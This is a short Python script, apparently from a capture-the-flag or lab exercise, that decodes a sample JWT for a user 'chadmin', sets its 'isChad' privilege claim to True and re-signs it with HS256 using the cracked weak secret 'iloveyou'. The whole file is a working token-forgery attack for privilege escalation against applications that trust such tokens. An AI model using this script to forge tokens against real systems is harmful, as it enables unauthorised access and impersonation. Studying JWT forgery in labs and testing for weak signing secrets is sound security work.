import jwt
import json
import base64

# Your original JWT (make sure it has 3 parts: header, payload, signature)
original_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VybmFtZSI6ImNoYWRtaW4iLCJpc0NoYWQiOnRydWUsImlhdCI6MTc3Mjc2ODM0OX0._ZV3hQcAz8II5nUetupJURjJvzaecSDNurAXgFEofAk"  # example JWT

# Base64 URL decode function (to decode JWT components)
def base64_url_decode(base64_url):
    padding = '=' * (4 - len(base64_url) % 4)
    return base64.urlsafe_b64decode(base64_url + padding)

# Split the JWT into its components: Header, Payload, and Signature
jwt_parts = original_jwt.split('.')
if len(jwt_parts) == 3:
    header_b64, payload_b64, signature_b64 = jwt_parts
else:
    print("Invalid JWT format: JWT must have 3 parts.")
    exit()

# Decode the header and payload
header_json = json.loads(base64_url_decode(header_b64).decode('utf-8'))
payload_json = json.loads(base64_url_decode(payload_b64).decode('utf-8'))

# Print original decoded JWT components
print("Original Header:")
print(json.dumps(header_json, indent=2))
print("\nOriginal Payload:")
print(json.dumps(payload_json, indent=2))

# Modify the payload to change 'isChad' to True
payload_json['isChad'] = True

# Print modified payload
print("\nModified Payload:")
print(json.dumps(payload_json, indent=2))

# JWT secret (password 'iloveyou')
secret = 'iloveyou'

# Re-encode the JWT with the modified payload
new_jwt = jwt.encode(payload_json, secret, algorithm='HS256', headers=header_json)

# Print the new JWT
print("\nGenerated JWT with modified payload:")
print(new_jwt)